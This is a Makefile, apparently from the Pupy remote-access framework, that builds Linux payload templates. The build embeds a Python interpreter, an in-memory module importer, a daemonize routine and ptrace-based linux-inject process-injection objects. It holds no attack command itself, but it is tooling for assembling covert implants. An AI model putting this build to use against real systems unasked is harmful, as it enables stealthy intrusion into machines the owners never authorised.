CFLAGS += $(shell pkg-config --cflags python-2.7) -fPIC
LDFLAGS += -pthread -ldl -fPIC
PIE ?= -pie

ARCH ?= $(shell uname -m)
ifeq ($(ARCH),x86_64)
ARCH := 64
else
ARCH := 32
endif

LINUX_INJECT_CFLAGS := -include debug.h -Dmain=linux_inject_main

ifneq ($(DEBUG),)
DEBUG_ADD := debug
CFLAGS += -DDEBUG -O0 -g
else
CFLAGS += -O2
LINUX_INJECT_CFLAGS += -Dprintf=dprint -Dfprintf=dfprint
endif

LIBPYTHON ?= $(shell ldconfig -p  | awk '/libpython2.7.so/{print $$4}' | head -n 1)

PYTHON ?= python
TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/

PYOBJS := _memimporter.o Python-dynload.o pupy_load.o pupy.o
COMMON_OBJS := resources_bootloader_pyc.o resources_python27_so.o  \
    resources_library_compressed_string_txt.o list.o tmplibrary.o daemonize.o

ifeq ($(ARCH),64)
COMMON_OBJS += linux-inject/inject-x86_64.o
else
COMMON_OBJS += linux-inject/inject-x86.o
endif

COMMON_OBJS += linux-inject/ptrace.o
COMMON_OBJS += linux-inject/utils.o

ZLIB := $(shell python -c 'import zlib; print zlib.__file__ if "__file__" in zlib.__dict__ else "built-in"')

ifneq ($(ZLIB),built-in)
COMMON_OBJS += resources_zlib_so.o
CFLAGS      += -D_PYZLIB_DYNLOAD

resources/zlib.so: $(ZLIB)
	cp -vf $< $@

resources_zlib_so.c: gen_resource_header.py resources/zlib.so
	$(PYTHON) $+
endif


all: $(TEMPLATE_OUTPUT_PATH)/pupyx$(ARCH).lin $(TEMPLATE_OUTPUT_PATH)/pupyx$(ARCH).so

import-tab.c import-tab.h: mktab.py
	$(PYTHON) $<

Python-dynload.o: Python-dynload.c import-tab.c import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS)

resources/library_compressed_string.txt: gen_library_compressed_string.py resources/library.zip
	$(PYTHON) gen_library_compressed_string.py

resources_library_compressed_string_txt.c: gen_resource_header.py resources/library_compressed_string.txt resources/library.zip
	$(PYTHON) gen_resource_header.py resources/library_compressed_string.txt

resources/bootloader.pyc: gen_python_bootloader.py ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py
	$(PYTHON) gen_python_bootloader.py $(DEBUG_ADD)

resources_bootloader_pyc.c: gen_resource_header.py resources/bootloader.pyc
	$(PYTHON) $+

linux-inject/%.o: linux-inject/%.c
	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<

resources/python27.so: $(LIBPYTHON)
	cp -vf $< $@

resources/library.zip: build_library_zip.py additional_imports.py
	$(PYTHON) $<

resources_python27_so.c: gen_resource_header.py resources/python27.so
	$(PYTHON) $+

$(TEMPLATE_OUTPUT_PATH)/pupyx$(ARCH).lin: main_exe.o $(PYOBJS) $(COMMON_OBJS)
	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(ARCH).so: main_so.o $(PYOBJS) $(COMMON_OBJS)
	$(CC) -shared $+ -o $@ $(LDFLAGS)

.PHONY: clean

clean:
	rm -f *.o
	rm -f *.pyc
	rm -f pupy pupy.so
	rm -f linux-inject/*.o
	rm -f resources/library.zip
	rm -f resources/*.so
	rm -f resources/*.pyc resources/library_patches/*.pyc
	rm -f resources/*.txt
